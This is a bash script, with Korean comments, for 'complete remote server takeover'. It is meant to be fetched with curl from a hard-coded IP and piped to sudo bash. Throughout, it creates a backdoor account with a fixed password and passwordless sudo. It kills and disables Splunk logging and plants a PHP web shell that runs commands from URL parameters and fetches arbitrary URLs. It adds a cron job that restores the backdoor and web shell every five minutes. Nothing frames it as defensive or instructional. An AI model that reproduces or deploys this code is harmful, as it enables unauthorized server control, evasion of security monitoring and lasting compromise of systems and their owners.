#!/bin/bash
###############################################################################
# 원격 서버 완전 장악 - 한 줄 명령어
# 팀원이 서버에서 이 한 줄만 실행하면 됨:
# curl -fsSL http://3.35.22.248/takeover.sh | sudo bash
###############################################################################

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   원격 서버 완전 장악                                     ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# 1. 백도어 사용자 생성
echo "[1] 백도어 사용자 생성 중..."
useradd -m -s /bin/bash sysadmin 2>/dev/null || echo "  [*] 사용자 이미 존재"
echo 'sysadmin:Adm1n!2024#Secure' | chpasswd
echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysadmin
chmod 0440 /etc/sudoers.d/sysadmin
id sysadmin
echo "[+] 백도어 사용자 생성 완료!"
echo ""

# 2. Splunk 무력화
echo "[2] Splunk 무력화 중..."
pkill -9 splunkd 2>/dev/null
pkill -9 splunk 2>/dev/null
systemctl stop Splunkd 2>/dev/null
systemctl disable Splunkd 2>/dev/null
chmod 000 /opt/splunk/bin/splunk 2>/dev/null
chmod 000 /opt/splunkforwarder/bin/splunk 2>/dev/null
echo "[+] Splunk 무력화 완료!"
echo ""

# 3. 영구 백도어 설치
echo "[3] 영구 백도어 설치 중..."
cat > /usr/local/bin/backdoor_keeper.sh << 'EOFSCRIPT'
#!/bin/bash
# 웹쉘 유지
WEBSHELL="/var/www/html/www/api/health.php"
if [ ! -f "$WEBSHELL" ]; then
    cat > "$WEBSHELL" << 'EOFPHP'
<?php
header('Content-Type: text/plain');
if (isset($_GET['cmd'])) {
    echo "=== Command Output ===\n";
    system($_GET['cmd']);
    echo "\n";
} elseif (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    $url = $_GET['url'];
    echo @file_get_contents($url);
} else {
    echo "OK\n";
}
?>
EOFPHP
    chown apache:apache "$WEBSHELL"
    chmod 644 "$WEBSHELL"
fi

# 백도어 사용자 유지
if ! id sysadmin &>/dev/null; then
    useradd -m -s /bin/bash sysadmin
    echo 'sysadmin:Adm1n!2024#Secure' | chpasswd
    echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysadmin
    chmod 0440 /etc/sudoers.d/sysadmin
fi
EOFSCRIPT

chmod +x /usr/local/bin/backdoor_keeper.sh
(crontab -l 2>/dev/null; echo '*/5 * * * * /usr/local/bin/backdoor_keeper.sh') | crontab -
echo "[+] 영구 백도어 설치 완료!"
echo ""

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   ✅ 서버 장악 완료!                                      ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "[+] 백도어 사용자: sysadmin"
echo "[+] 비밀번호: Adm1n!2024#Secure"
echo "[+] sudo: NOPASSWD"
echo ""
echo "[+] SSH 접속:"
echo "    ssh sysadmin@$(hostname -I | awk '{print $1}')"
echo ""
